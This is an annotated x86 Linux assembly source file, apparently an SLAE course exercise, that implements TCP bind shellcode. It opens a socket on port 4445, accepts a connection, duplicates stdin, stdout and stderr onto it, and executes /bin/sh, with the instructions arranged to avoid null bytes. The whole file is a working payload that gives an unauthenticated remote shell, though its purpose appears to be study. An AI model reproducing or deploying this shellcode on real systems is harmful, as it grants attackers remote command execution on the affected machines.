
;Author: Ymir F. Eboras
;SHELL_BIND_TCP



global _start

section .text


_start:

	;print we are starting
	
	xor eax, eax
	mov al, 0x4
	xor ebx, ebx
	mov bl, 0x1
	xor ecx, ecx
	mov ecx, print_start
	xor edx, edx
	mov dl, 0x2b
	int 0x80

	;push AF_INET(2), SOCK_STREAM(1), IP_TCP(6) to the stack in reverse order
	
	push 0x6
	push 0x1
	push 0x2

	xor eax, eax          ;remove x00/NULL byte
	mov al, 0x66	      ;syscall 102 for socketcall
	xor ebx, ebx          ;remove x00/NULL bytes
	mov bl, 0x1	      ;net.h SYS_SOCKET 1 (0x1)
	xor ecx, ecx          ;remove x00/NULL bytes
	mov ecx, esp          ;arg_2 *args, esp address to ecx
	int 0x80              ;interupt/excecute
	

	mov edi, eax	      ;sockfd, store return value of eax into edi
	
bind:

	jmp short port_to_bind



call_bind:
	
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) 

	pop esi			; pops port_number/ESP addr to esi register
	xor eax, eax		; removes x00/NULL byte
	push eax		; pushes the NULL value to stack
	push word[esi]		; push actual port # to the stack, word=2 bytes
	mov al, 0x2		; AF_INET IPV4
	push ax		
	mov edx, esp		; store stack address into edx (struct sockaddr)
	push 0x10		; store length addr on stack
	push edx		; push struct sockaddr to the stack
	push edi		; sockfd from the eax _start
	xor eax, eax		; removex x00/NULL byte
	mov al, 0x66		; syscall 102 for socketcall
	mov bl, 0x02		; net.h SYS_BIND 2
	mov ecx, esp		; arg for SYS_BIND
	int 0x80		; interrupt/execute 


listen:

	; int listen (int sockfd, int backlog)

	push 0x1		; int backlog
	push edi		; sockfd from eax _start
	xor eax, eax		; remove x00/NULL byte
	mov al, 0x66		; syscall 102 for socketcall
	xor ebx, ebx		; remove x00/NULL byte
	mov bl, 0x4		; net.h SYS_LISTEN 4
	xor ecx, ecx		; remove x00/NULL byte
	mov ecx, esp		; arg for SYS_LISTEN
	int 0x80		; interrupt/execute
	
accept:

	;int accept(int sockfd, struck sockaddr *addr, socklen_t *addrlen)

	xor eax, eax		; remove x00/NULL byte
	push eax		; push NULL value to addrlen
	xor ebx, ebx		; remove x00/NULL byte
	push ebx		; push NULL value to addr
	push edi		; sockfd from eax _start
	mov al, 0x66		; syscall 102 for socketcall
	mov bl, 0x5		; net.h SYS_ACCEPT 5
	xor ecx, ecx		; remove x00/NULL byte
	mov ecx, esp		; arg for accept
	int 0x80		; interrupt/execute

change_fd:

	; this was all the dup2 functions seen in the SLAE Module 2, 035
	; this ensures file (/bin/sh) goes through the socket connection

	; int dup2(int oldfd, int newfd


	mov ebx, eax		; moves fd from accept to ebx
	xor ecx, ecx		; removes 0x00/NULL byte, 0 (std in)
	xor eax, eax		; removes 0x00/NULL byte
	mov al, 0x3f		; syscall 63 for dup2
	int 0x80		; interrupt/execute

	mov al, 0x3f		; syscall 63 for dup2
	inc ecx			; +1 to ecx, 1 (std out)
	int 0x80		; interrupt/execute

	mov al, 0x3f		; syscall 63 for dup2
	inc ecx			; +1 to ecx, 2 (std error)
	int 0x80		; interrupt execute


execve:
	
	xor eax, eax		; removes x00/NULL byte
	push eax		; push first null dword

	push 0x68732f2f		;hs//
	push 0x6e69622f		;nib/

	mov ebx, esp		; save stack pointer in ebx

	push eax		; push null byte terminator
	mov edx, esp		; moves address of 0x00hs//nib/ into ecx

	push ebx
	mov ecx, esp

	mov al, 0xb		; syscall 11 for execve
	int 0x80


port_to_bind:

	call call_bind
	port_number dw 0x5d11	; port 4445 (ox115d) in little endian
				; this gets pushed to the stack, after the call

section .data
	
	print_start: db "[+] Starting shell_bind_tcp", 0xa, "[+] Port: 4445", 0xa
	print_start_len equ $-print_start
